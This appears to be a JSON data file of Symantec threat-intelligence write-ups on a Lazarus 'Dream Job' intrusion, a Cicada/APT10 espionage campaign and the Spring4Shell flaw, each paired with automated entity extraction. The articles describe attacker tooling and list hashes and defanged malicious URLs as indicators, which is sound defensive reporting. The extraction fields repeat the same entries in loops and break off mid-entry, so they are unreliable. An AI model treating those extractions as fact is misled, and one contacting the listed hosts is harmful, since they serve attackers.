(5f20cc6a6a82b940670a0f89eda5d68f091073091394c362bfcaf52145b058db) is executed multiple times, which again is another shellcode loader and has the same command line arguments as seen with final.cpl: 07:39 –A scheduled task is created: The task is used to auto-start and execute addins.bat each time the system is booted. The task uses the service name 'uso' (a file name previously used in older Dream Job campaigns targeting security researchers). The attacker runs addins.cpl again to run a command to start the service and then delete the service directly after: The following commands were then executed to collect information pertaining to network configuration, current user the attackers are logged in as, active users on the machine, available shared drives, and the contents of the 'addins' directory. 07:41 –The file addins.cpl is executed again multiple times before a scheduled task is created to run addins.bat again, start the service, and immediately delete the service: The attackers execute addins.cpl again with the same command line as before. No further activity is observed. The Lazarus group is likely targeting organizations in the chemical sector to obtain intellectual property to further North Korea’s own pursuits in this area. The group’s continuation of Operation Dream Job, as witnessed by Symantecand others, suggests that the operation is sufficiently successful. As such, organizations should ensure they have adequate security in place and remain vigilant for attacks such as this. As always, users should be wary of clicking links or downloading files even if they come from seemingly trustworthy sources. For the latest protection updates, please visit theSymantec Protection Bulletin. 164f6a8f7d2035ea47514ea84294348e32c90d817724b80ad9cd3af6f93d83f8 18686d04f22d3b593dd78078c9db0ac70f66c7138789ad38469ec13162b14cef 1cb8ea3e959dee988272904dbb134dad93539f2c07f08e1d6e10e75a019b9976 2dd29b36664b28803819054a59934f7a358a762068b18c744281e1589af00f1f 32bfdf1744077c9365a811d66a6ea152831a60a4f94e671a83228016fc87615f 35de8163c433e8d9bf6a0097a506e3abbb8308330d3c5d1dea6db71e1d225fc3 4277fcaada4939b76a3df4515b7f74837bf8c4b75d4ff00f8d464169eede01e3 4446efafb4b757f7fc20485198236bed787c67ceffc05f70cd798612424384ce 48f3ead8477f3ef16da6b74dadc89661a231c82b96f3574c6b7ceb9c03468291 4a2236596e92fa704d8550c56598855121430f96fe088712b043cba516f1c76c 54029bd4fcc24551564942561a60b906bee136264f24f43775b7a8e15095a9e0 56da872e8b0f145417defd4a37f357b2f73f244836ee30ac27af7591cda2d283 5e7edc8f1c652f53a6d2eabfbd9252781598de91dbe59b7a74706f69eb52b287 5f20cc6a6a82b940670a0f89eda5d68f091073091394c362bfcaf52145b058db 61e305d6325b1ffb6de329f1eb5b3a6bcafa26c856861a8200d717df0dec48c4 67f1db122ad8f01e5faa60e2facf16c0752f6ab24b922f218efce19b0afaf607 7491f298e27eb7ce7ebbf8821527667a88eecd5f3bc5b38cd5611f7ebefde21e 79b7964bde948b70a7c3869d34fe5d5205e6259d77d9ac7451727d68a751aa7d 7aa62af5a55022fd89b3f0c025ea508128a03aab5bc7f92787b30a3e9bc5c6e4 8769912b9769b4c11aabc523a699d029917851822d4bc1cb6cc65b0c27d2b135 8aace6989484b88abc7e3ec6f70b60d4554bf8ee0f1ccad15db84ad04c953c2d 942489ce7dce87f7888322a0e56b5e3c3b0130e11f57b3879fbefc48351a78f6 a881c9f40c1a5be3919cafb2ebe2bb5b19e29f0f7b28186ee1f4b554d692e776 bdb76c8d0afcd6b57c8f1fa644765b95375af2c3a844c286db7f60cf9ca1a22a d815fb8febaf113f3cec82f552dfec1f205071a0492f7e6a2657fa6b069648c6 e1997d1c3d84c29e02b1b7b726a0d0f889a044d7cd339f4fb88194c2c0c6606d e31af5131a095fbc884c56068e19b0c98636d95f93c257a0c829ec3f3cc8e4ba ef987baef9a1619454b14e1fec64283808d4e0ce16fb87d06049bfcf9cf56af3 f29d386bdf77142cf2436797fba1f8b05fab5597218c2b77f57e46b8400eb9de f7359490d6c141ef7a9ee2c03dbbd6ce3069e926d83439e1f8a3dfb3a7c3dc94 f8995634b102179a5d3356c6f353cb3a42283d9822e157502486262a3af4447e ff167e09b3b7ad6ed1dead9ee5b4747dd308699a00905e86162d1ec1b61e0476 [URL]/[FOLDER]/[FILENAME]asp?prd_fld=racket happy.nanoace[.]co.kr hxxp://happy.nanoace[.]co.kr/Content/rating/themes/krajee-fas/FrmAMEISMngWeb.asp hxxps://mariamchurch[.]com/board/news/index.asp hxxps://www.aumentarelevisite[.]com/img/context/offline.php www.aumentarelevisite[.]com www.ric-camid[.]re.kr The Threat Hunter Team is a group of security experts within Broadcom whose mission is to investigate targeted attacks, drive enhanced protection in Symantec and Carbon Black products, and offer analysis that helps customers respond to attacks. We encourage you to share your thoughts on your favorite social platform.",
    "extraction": {
      "raw_output": "Named Entities: (Symantec, Company), (Broadcom Software, Company), (North Korea, Country), (Advanced Persistent Threat, Threat Type), (Lazarus, Attacker), (Operation Dream Job, Campaign), (fake job offer, Technique), (malicious links, Technique), (malicious attachments, Technique), (malware, Malware), (spyware, Malware), (HTM file, File), (South Korea, Country), (information technology, Technology), (chemical sector, Sector), (defense, Industry), (government, Industry), (engineering, Industry)\nRelationships: (Symantec, tracks, Pompilus), (Pompilus, uses, Operation Dream Job), (Operation Dream Job, targets, chemical sector), (Operation Dream Job, targets, IT sector), (Operation Dream Job, continues, past activities), (past activities, involve, fake job offers), (past activities, involve, malicious links), (past activities, involve, malicious attachments), (past activities, involve, spyware), (past activities, involve, HTM files), (Operation Dream Job, uses, fake job offers), (Operation Dream Job, uses, malicious links), (Operation Dream Job, uses, malicious attachments), (Operation Dream Job, uses, spyware), (Operation Dream Job, uses, HTM files), (Operation Dream Job, uses, malicious links), (Operation Dream Job, uses, malicious attachments), (Operation Dream",
      "entities": [
        [
          "Symantec",
          "Company"
        ],
        [
          "Broadcom Software",
          "Company"
        ],
        [
          "North Korea",
          "Country"
        ],
        [
          "Advanced Persistent Threat",
          "Threat Type"
        ],
        [
          "Lazarus",
          "Attacker"
        ],
        [
          "Operation Dream Job",
          "Campaign"
        ],
        [
          "fake job offer",
          "Technique"
        ],
        [
          "malicious links",
          "Technique"
        ],
        [
          "malicious attachments",
          "Technique"
        ],
        [
          "malware",
          "Malware"
        ],
        [
          "spyware",
          "Malware"
        ],
        [
          "HTM file",
          "File"
        ],
        [
          "South Korea",
          "Country"
        ],
        [
          "information technology",
          "Technology"
        ],
        [
          "chemical sector",
          "Sector"
        ],
        [
          "defense",
          "Industry"
        ],
        [
          "government",
          "Industry"
        ],
        [
          "engineering",
          "Industry"
        ]
      ],
      "relationships": [
        [
          "Symantec",
          "tracks",
          "Pompilus"
        ],
        [
          "Pompilus",
          "uses",
          "Operation Dream Job"
        ],
        [
          "Operation Dream Job",
          "targets",
          "chemical sector"
        ],
        [
          "Operation Dream Job",
          "targets",
          "IT sector"
        ],
        [
          "Operation Dream Job",
          "continues",
          "past activities"
        ],
        [
          "past activities",
          "involve",
          "fake job offers"
        ],
        [
          "past activities",
          "involve",
          "malicious links"
        ],
        [
          "past activities",
          "involve",
          "malicious attachments"
        ],
        [
          "past activities",
          "involve",
          "spyware"
        ],
        [
          "past activities",
          "involve",
          "HTM files"
        ],
        [
          "Operation Dream Job",
          "uses",
          "fake job offers"
        ],
        [
          "Operation Dream Job",
          "uses",
          "malicious links"
        ],
        [
          "Operation Dream Job",
          "uses",
          "malicious attachments"
        ],
        [
          "Operation Dream Job",
          "uses",
          "spyware"
        ],
        [
          "Operation Dream Job",
          "uses",
          "HTM files"
        ],
        [
          "Operation Dream Job",
          "uses",
          "malicious links"
        ],
        [
          "Operation Dream Job",
          "uses",
          "malicious attachments"
        ]
      ],
      "has_entities": true
    },
    "entity_count": 18,
    "relationship_count": 17
  },
  {
    "title": "cicada apt10 china ngo government attacks",
    "link": "https://www.security.com/threat-intelligence/cicada-apt10-china-ngo-government-attacks",
    "content": "A Chinese state-backed advanced persistent threat (APT) group is attacking organizations around the globe in a likely espionage campaign that has been ongoing for several months. Victims in this Cicada (aka APT10) campaign include government, legal, religious, and non-governmental organizations (NGOs) in multiple countries around the world, including in Europe, Asia, and North America. The wide number of sectors and geographies of the organizations targeted in this campaign is interesting. Cicada’s initial activity several years ago was heavily focused on Japanese-linked companies, though in more recent times it has been linked to attacks on managed service providers (MSPs) with a more global footprint. However, this campaign does appear to indicate a further widening of Cicada’s targeting. The attribution of this activity to Cicada is based on the presence on victim networks of a custom loader and custom malware that are believed to be exclusively used by the APT group. While Cicada has been linked to espionage-style operations dating back to 2009, the earliest activity in this current campaign occurred in mid-2021, with the most recent activity seen in February 2022, so this is a long-running attack campaign that may still be ongoing, researchers from Symantec, a division ofBroadcom, have found. In several cases, the initial activity on victim networks is seen on Microsoft Exchange Servers, suggesting the possibility that a known, unpatched vulnerability in Microsoft Exchange may have been used to gain access to victim networks in some cases. Once the attackers have successfully gained access to victim machines we observe them deploying various different tools, including a custom loader and the Sodamaster backdoor. The loader deployed in this campaign was also deployed in a previous Cicada attack. Sodamaster is a known Cicada tool that is believed to be exclusively used by this group. It is a fileless malware that is capable of multiple functions, including evading detection in a sandbox by checking for a registry key or delaying execution; enumerating the username, hostname, and operating system of targeted systems; searching for running processes, and downloading and executing additional payloads. It is also capable of obfuscating and encrypting traffic that it sends back to its command-and-control (C&C) server. It is a powerful backdoor that Cicada has been using since at least 2020. In this campaign, the attackers are also seen dumping credentials, including by using a custom Mimikatz loader. This version of Mimikatz drops mimilib.dll to obtain credentials in plain text for any user that is accessing the compromised host and provides persistence across reboots. The attackers also exploit the legitimate VLC Media Player by launching a custom loader via the VLC Exports function, and use the WinVNC tool for remote control of victim machines. Other tools utilized in this attack campaign include: The victims in this campaign appear to primarily be government-related institutions or NGOs, with some of these NGOs working in the fields of education and religion. There were also victims in the telecoms, legal, and pharmaceutical sectors. The victims are spread through a wide number of regions including the U.S., Canada, Hong Kong, Turkey, Israel, India, Montenegro, and Italy. There is also just one victim in Japan, which is notable due to Cicada’s previous strong focus on Japanese-linked companies. The attackers spent as long as nine months on the networks of some victims. The victims targeted, the various tools deployed in this campaign, and what we know of Cicada’s past activity all indicate that the most likely goal of this campaign is espionage. Cicada activity waslinked by U.S. government officials to the Chinese governmentin 2018. This is a long-running campaign from a sophisticated and experienced nation-state-backed actor that may still be ongoing, as the most recent activity we saw in this campaign was in February 2022. The targeting of multiple large organizations in different geographies at the same time would require a lot of resources and skills that are generally only seen in nation-state backed groups, and shows that Cicada still has a lot of firepower behind it when it comes to its cyber activities. For the latest protection updates, please visit theSymantec Protection Bulletin. If an IOC is malicious and the file available to us, Symantec Endpoint products will detect and block that file. 01b610e8ffcb8fd85f2d682b8a364cad2033c8104014df83988bc3ddfac8e6ec 056c0628be2435f2b2031b3287726eac38c94d1e7f7aa986969baa09468043b1 062ce400f522f90909ed5c4783c5e9c60b63c09272e2ddde3d13e748a528fa88 0b452f7051a74a1d4a544c0004b121635c15f80122dc6be54db660ceb2264d6f 0ec48b297dd1b0d6c3ddd15ab63f405191d7a849049feedfa7e44096c6f9d42a 20fc3cf1afcad9e6f19e9abebfc9daf374909801d874c3d276b913f12d6230ec 2317d3e14ab214f06ae38a729524646971e21b398eda15cc9deb8b00b231abc3 2417da3adebd446b9fcb8b896adb14ea495a4d923e3655e5033f78d8e648fcc8 37f56127226ce96af501c8d805e76156ca6b87da1ba1bb5d227100912f6c52d9 3aa54e7d99b69a81c8b25ab57aeb971644ed0a206743c9e51a80ec1852f03663 3ff2d6954a6b62afb7499e1e317af64502570181fd49ac5a74e2f7947e2e89db 4f6a768841595293146ca04f879efa988e4e95ce0f2bc299cb669fea55e78b65 5269db6b19a1d758c75e58ee9bbf2f8fd684cfedbfe712d5b0182d7bbd3a1690 5bc68df582c86c884b563b15057cc223f2e9bc1022ebb297e32a9a7e3036228b 6b4692029f05489ecda10e11cfacfc3b19097856b88647d3695f3bdc7dd83ce9 7b581c0305c78f28bad60028c63e852dc34fc9e28f39e4b0af73d80c1d9680c9 83030f299a776114878bcd2ade585d97836ef4ddb6943cb796be2c88bcb83a83 90a03dabfc4e56a12cc3bac5cbe991db044b900a01ec341803c864506e467ffa 9917a2213f114e87745867e5fea6717efd727d7c08fdc851969224be2f0e019b 9b5f9ff82ed238bcbd83628ed3ec84988dc05f81cec9e45a512fbd2c8ac45c33 adfe177ade7d9bfe4df251a69678102aec1104a4ba9f73032dd90aba76d8bdd9 b76fde584f87c88bdd21fab613335ce7fc05788aa4bb3191d1517ec16ef4d11a ce45af43dd2af52d6034e981515474147802efdfe036e00078fee29a01694fd6 d461347388ccf0c2008332a1674885a41f70b94b2263bddef44e796d3b1b43b5 df993dca434c3cd2da94b6a90b0ae1650d9c95ea1d5f6a5267aca640d8c6d00e ee46e714660f7652502d5b3633fae0c08c8018f51cfb56a487afd58d04dd551a fe33fdd5a63fee62362c9db329dde11080a0152e513ef0e6f680286a6a7b243f The Threat Hunter Team is a group of security experts within Broadcom whose mission is to investigate targeted attacks, drive enhanced protection in Symantec and Carbon Black products, and offer analysis that helps customers respond to attacks. We encourage you to share your thoughts on your favorite social platform.",
    "extraction": {
      "raw_output": "Named Entities: (Cicada, Attacker), (Apt10, Threat Type), (custom loader, Tool), (custom malware, Malware), (mid-2021, Date), (February 2022, Date)\nRelationships: (Cicada, uses, custom loader), (Cicada, uses, custom malware), (Cicada, launched, mid-2021), (Cicada, ended, February 2022)",
      "entities": [
        [
          "Cicada",
          "Attacker"
        ],
        [
          "Apt10",
          "Threat Type"
        ],
        [
          "custom loader",
          "Tool"
        ],
        [
          "custom malware",
          "Malware"
        ],
        [
          "mid-2021",
          "Date"
        ],
        [
          "February 2022",
          "Date"
        ]
      ],
      "relationships": [
        [
          "Cicada",
          "uses",
          "custom loader"
        ],
        [
          "Cicada",
          "uses",
          "custom malware"
        ],
        [
          "Cicada",
          "launched",
          "mid-2021"
        ],
        [
          "Cicada",
          "ended",
          "February 2022"
        ]
      ],
      "has_entities": true
    },
    "entity_count": 6,
    "relationship_count": 4
  },
  {
    "title": "spring4shell rce vuln java",
    "link": "https://www.security.com/threat-intelligence/spring4shell-rce-vuln-java",
    "content": "UPDATE, April 1, 2022:Updated with additional protection information A zero-day vulnerability in the Spring Core Java framework that could allow for unauthenticated remote code execution (RCE) on vulnerable applications was publicly disclosed on March 30, before a patch was released. It was dubbed Spring4Shell. Yes, Symantec products will guard against exploit attempts with the following detections: Data Center Security (DCS) Intrusion Prevention (with default policies) provides zero-day protection against exploitation of the Spring4Shell vulnerability. Spring has now released Spring Framework 5.3.18 and 5.2.20, which it says address the vulnerability. Spring Boot 2.6.6 and 2.5.12 that depend on Spring Framework 5.3.18 have also been released.Temporary remediation stepswere also published by researchers at Praetorian prior to the updates being released. Springalso published suggested workarounds in its blog. A CVE report for the vulnerability was also published this afternoon and given the designationCVE-2022-22965, and assessed as being “high severity.” There appears to have been confusion about the potential severity of Spring4Shell. While it was initially reported that all versions of Spring Core with the JDK version greater than or equal to 9.0 were vulnerable to it, researcherssubsequently determinedthat it appears Spring Coremust be configured in a certain wayto be vulnerable. In itsvulnerability report, Spring itself stated that for the “specific exploit” to work, an application must meet the following prerequisites: “If the application is deployed as a Spring Boot executable jar, i.e. the default, it is not vulnerable to the exploit,” the advisory reads. However, it did also say that “the nature of the vulnerability is more general, and there may be other ways to exploit it.” Given these prerequisites, it’s not clear how many instances of the Spring Core Java framework may be vulnerable to this bug. Proof-of-concept exploit code for Spring4Shell was leaked on GitHub shortly after it was discovered and before a patch was issued. The code was swiftly removed, but not before it was downloaded by several security researchers who confirmed the vulnerability. It was also reposted on various platforms, meaning it was available to the public, including malicious actors. Ithas been reported that Spring4Shell was being actively exploitedin attacks. Spring4Shell is a bug in Spring Core, a popular application framework that allows software developers to quickly and easily develop Java applications with enterprise-level features. These applications can then be deployed on servers, such as Apache Tomcat, as stand-alone packages with all the required dependencies. The bug allows an unauthenticated attacker to execute arbitrary code on a vulnerable system. In a blog published on Thursday(March 31), Spring revealed that the Spring4Shell bug was reported to VMware (which owns Spring) by researchers from AntGroup FG on Tuesday, with the team intending to release emergency patches for the bug on Thursday, but details of the bug were leaked online on Wednesday. No, CVE-2022-22963 is a different bug in the Spring Cloud Function, which is a separate Java library from Spring Core. An advisory for this bugwas published on March 29and patches are available for it. While the naming of the vulnerability appears to have been inspired by theLog4Shell vulnerability that was discovered in December 2021, it is not clear if the impact of this bug will be as significant. We will update this blog with any new relevant information as we get it. For the latest protection updates, please visit theSymantec Protection Bulletin. The Threat Hunter Team is a group of security experts within Broadcom whose mission is to investigate targeted attacks, drive enhanced protection in Symantec and Carbon Black products, and offer analysis that helps customers respond to attacks. We encourage you to share your thoughts on your favorite social platform.",
    "extraction": {
      "raw_output": "Named Entities: (Spring Core Java framework, Tool), (unauthenticated remote code execution (RCE), Technique), (CVE-2022-22965, CVE), (Symantec products, Tool), (Data Center Security (DCS) Intrusion Prevention (with default policies), Tool), (Spring Framework 5.3.18, Tool), (Spring Boot 2.6.6, Tool), (Spring Boot 2.5.12, Tool)\nRelationships: (Spring Core Java framework, contains, Spring4Shell), (Spring Core Java framework, uses, RCE), (Spring Core Java framework, must be configured, certain way), (Spring Core Java framework, is vulnerable to, Spring4Shell), (Spring Core Java framework, is vulnerable to, CVE-2022-22965), (Spring Core Java framework, is vulnerable to, Spring4Shell), (Spring Core Java framework, is vulnerable to, Spring4Shell), (Spring Core Java framework, is vulnerable to, Spring4Shell), (Spring Core Java framework, is vulnerable to, Spring4Shell), (Spring Core Java framework, is vulnerable to, Spring4Shell), (Spring Core Java framework, is vulnerable to, Spring4Shell), (Spring Core Java framework, is vulnerable to, Spring4Shell), (Spring Core Java framework, is vulnerable to, Spring4Shell), (Spring Core Java framework, is vulnerable to",
      "entities": [
        [
          "Spring Core Java framework",
          "Tool"
        ],
        [
          "CVE-2022-22965",
          "CVE"
        ],
        [
          "Symantec products",
          "Tool"
        ],
        [
          "Spring Framework 5.3.18",
          "Tool"
        ],
        [
          "Spring Boot 2.6.6",
          "Tool"
        ],
        [
          "Spring Boot 2.5.12",
          "Tool"
        ]
      ],
      "relationships": [
        [
          "Spring Core Java framework",
          "contains",
          "Spring4Shell"
        ],
        [
          "Spring Core Java framework",
          "uses",
          "RCE"
        ],
        [
          "Spring Core Java framework",
          "must be configured",
          "certain way"
        ],
        [
          "Spring Core Java framework",
          "is vulnerable to",
          "Spring4Shell"
        ],
        [
          "Spring Core Java framework",
          "is vulnerable to",
          "CVE-2022-22965"
        ],
        [
          "Spring Core Java framework",
          "is vulnerable to",
          "Spring4Shell"
        ],
        [
          "Spring Core Java framework",
          "is vulnerable to",
          "Spring4Shell"
        ],
        [
          "Spring Core Java framework",
          "is vulnerable to",
          "Spring4Shell"
        ],
        [
          "Spring Core Java framework",
          "is vulnerable to",
          "Spring4Shell"
        ],
        [
          "Spring Core Java framework",
          "is vulnerable to",
          "Spring4Shell"
        ],
        [
          "Spring Core Java framework",
          "is vulnerable to",
          "Spring4Shell"
        ],
        [
          "Spring Core Java framework",
          "is vulnerable to",
          "Spring4Shell"
        ],
        [
          "Spring Core Java framework",
          "is vulnerable to",
          "Spring4Shell"
        ]
      ],
      "has_entities": true
    },
    "entity_count": 6,
    "relationship_count": 13
  }
]